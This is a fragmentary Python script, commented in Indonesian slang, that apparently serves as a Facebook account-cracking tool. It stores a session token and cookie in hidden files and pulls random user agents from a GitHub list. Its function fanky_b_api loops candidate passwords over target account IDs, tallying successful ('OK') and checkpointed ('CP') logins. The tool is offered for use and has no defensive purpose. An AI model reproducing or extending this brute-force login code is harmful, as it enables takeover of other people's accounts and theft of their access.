# Jangan Disebar komtol
# Pengen gacor oprek sendiri
# Author : FendiGamteng
# Python3
...
def uaku():
    try:
        ...
        url = "https://raw.githubusercontent.com/Mas-Jawa/Prem/main/useragent.txt"
...
try:
    uasayang = open("useragent.txt", "r").read().splitlines()
    for fn in uasayang:
        ugen.append(fn)
...
def login():
    try:
        token = open(".fentoken.txt", "r").read()
        cok = open(".fencookie.txt", "r").read()
...
def logincoki():
	try:
		...
		open('.fencookie.txt','w').write(cok)
		with requests.Session() as r:
			try:
				...
				if  '"access_token":' in str(response.headers):
					...
					open('.fentoken.txt','w').write(token)
		...
		sleep(2);exit()
	except Exception as e:os.system('rm -rf .fencookie.txt');os.system('rm -rf .fentoken.txt');print(e);exit()
...
def menu():
    ...
    try:
        token = open(".fentoken.txt", "r").read()
        cookie = open(".fencookie.txt", "r").read()
        tokenku.append(token)
    except IOError:
        Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa tolkon")
        os.system("rm -rf .fentoken.txt && rm -rf .fencookie.txt")
        time.sleep(3)
        login()
    try:
...
[{color_text}05{P2}]. {M2}EXIT{P2}""",width=60,title="MENU",style=f"{color_panel}"))
    ...
    if HaHi in ["1", "01"]:
        ...
        os.system('rm -rf .fencookie.txt');os.system('rm -rf .fentoken.txt')
...
def pilih_file(file_map, folder, warna_akun):
    ...
    if pilihan not in file_map:
        console.print(f" {H2}• {P2}Pilih Yang Bener Asu")
        exit()
...
def fanky_b_api(idf, pwv):
    ...
    ua = random.choice(ugen)
    ses = requests.Session()
    prog.update(des, description=f" {K2}•{H2} PROSES KREK {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    for pw in pwv:
        try:
